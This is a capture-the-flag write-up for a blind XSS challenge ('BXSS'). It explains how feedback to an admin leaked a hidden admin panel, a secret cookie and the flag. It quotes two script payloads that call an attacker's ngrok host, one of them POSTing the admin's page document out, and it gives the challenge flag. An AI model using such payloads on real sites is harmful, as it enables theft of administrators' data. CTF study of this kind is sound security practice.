# BXSS

Blind XSS leaks hidden admin panel and with secret cookie we could read flag. 

## Enumeration

The page allowed us to send feedback to the admin. Name hinted that this challenge propably involved blind xss. However I first tried to send some basic xss payloads but nothing happened. 

Then I sent following payload to my ngrok server and it pinged!
```javascript
<script>fetch("http://x.ngrok.io")</script>
```

Next I needed to figure out what to do with this xss. 
I crafted a payload and used it for printing cookies and other stuff, but nothing interesting showed up. Then I sent the whole document to my server. 
```javascript
<script>fetch("http://x.ngrok.io", {method: "POST", body: JSON.stringify(document)})</script>
```

The response had this data
```json
{
  "location": {
    "ancestorOrigins": {},
    "href": "http://0.0.0.0:8080/Secret_admin_cookie_panel",
    "origin": "http://0.0.0.0:8080",
    "protocol": "http:",
    "host": "0.0.0.0:8080",
    "hostname": "0.0.0.0",
    "port": "8080",
    "pathname": "/Secret_admin_cookie_panel",
    "search": "",
    "hash": ""
  }
}
```

One of my teammates found out you could go to the [/Secret_admin_cookie_panel](http://web.zh3r0.cf:3333/Secret_admin_cookie_panel) using a browser

## Finding the flag

The site showed xss payloads that other people did. (Not sure if intended or not)
We found out that site had this weird cookie called: `zyperxsecret_cookiehahah`

From the admin panel, we saw someone trying [/flag](http://web.zh3r0.cf:3333/flag), so we went to that page and there the flag was. 

Later we realized that you couldn't access the `/flag` page without that special cookie and you needed xss to find out that panel and get the cookie. 
### Flag
`zh3r0{{Ea5y\_bx55\_ri8}}`